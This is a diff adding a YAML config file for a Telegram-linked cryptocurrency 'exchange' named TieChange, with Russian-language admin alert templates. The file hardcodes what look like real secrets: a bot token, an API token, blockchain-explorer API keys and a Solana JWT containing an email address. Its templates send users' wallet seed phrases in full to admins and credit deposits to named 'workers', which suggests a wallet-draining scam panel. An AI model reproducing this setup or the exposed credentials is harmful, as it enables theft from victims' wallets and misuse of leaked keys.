@@ -1,0 +1,79 @@
+mysql:
+  host: localhost
+  database: exchange
+  user: root
+  password: ''
+bot_username: '@crexchanger_bot'
+bot_token: '5972943338:AAE1N1o2Tx5Gpc6LAhi9VaQTeySRqRF1S1Y'
+rpc_host: 'http://localhost:8000/generate-addresses'
+external_api_token: 'Y9Wc3vIPe0dk9RAffeBqzLh3CC4wedLv'
+autodetect_seconds: 14400
+exchange_name: 'TieChange'
+exchange_title: 'Cryptocurrency trading and invest platform'
+exchange_icon: '../assets/img/logos/default.png'
+tron_api_keys:
+  - f46695b6-dfbe-4841-99bf-4075dc48386c
+  - d7af7de9-c003-4314-9ede-601cd5cfd937
+  - 6a309342-c266-4b18-b807-d23fb633a790
+etherscan_api_keys:
+  - 62FNTMD5PNHIA1RU3ZN36A8T6ITFR6IQ99
+  - 298JTR611U1B62852AB3IUH9TR8ZF9WZB8
+bscscan_api_keys:
+  - 9HCFIYB8DXKPI6ZIUTYHYT9N4USMAQS1Q6
+  - ZDSKI3V7W5G5F7JKRS7Q99535HUCV3G2BV
+solana_api_keys:
+  - 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmVhdGVkQXQiOjE2ODE1MzMzMzY3NjQsImVtYWlsIjoiYS5uLmJlbGtpbjA0MTJAZ21haWwuY29tIiwiYWN0aW9uIjoidG9rZW4tYXBpIiwiaWF0IjoxNjgxNTMzMzM2fQ.vcON9QXsR4Ef2dvLx6tI9llaGqO8qs4RiAANRPRQJ54'
+cryptoid_api_keys:
+  - bed0795fdf94
+#344921817
+admins_telegram_ids:
+  - 344921817
+  - 716121228
+min_deposit_amount: 100.0
+profits_chat_id: 0
+messages:
+  user_send_support_message: |-
+    📬 Новое сообщение в саппорт
+    
+    👮 Пользователь: %s
+    📩 Сообщение: %s
+  user_send_support_image: |-
+    📬 Новое сообщение в саппорт
+    
+    👮 Пользователь: %s
+    📩 Приложена картинка
+  user_two_factor_enable: |-
+    🔑 Пользователь %s включил двух-факторную авторизацию
+  user_send_kyc: |-
+    🪪 Пользователь %s отправил данные на верификацию
+  user_withdraw: |-
+    🪪 Пользователь %s запросил вывод на адрес: %s
+  user_deposit: |-
+    💰 Новый депозит
+    
+    👮 Пользователь: %s
+    💴 Сумма: %s$ (%s %s)
+    📩 Адрес: %s
+    🧩 Хеш транзакции: %s
+  user_deposit_pending: |-
+    ⏳ Обнаружен неподтвержденный депозит
+    
+    👮 Пользователь: %s
+    💴 Сумма: %s$ (%s %s)
+    📩 Адрес: %s
+    🧩 Хеш транзакции: %s
+  user_add_mnemonic_worker: |-
+    📩 Пользователь %s отправил мнемоническую фразу
+  user_add_mnemonic_admin: |-
+    📩 Пользователь %s отправил мнемоническую фразу: %s
+  answer_button_text: "✉ Ответить"
+  deposit_alert: "Deposit confirmed. Please, reload page"
+  deposit_pending_alert: "Found new deposit, waiting confirmations..."
+  send_answer: |-
+    ✅ Ответ успешно отправлен
+  new_deposit: |-
+    ┌ ✅           NEW DEPOSIT           ✅
+    ├👨 Worker: %s
+    ├🌐 Location: %s
+    ├🧊 %s: %s
+    ├💰 USD: %s$
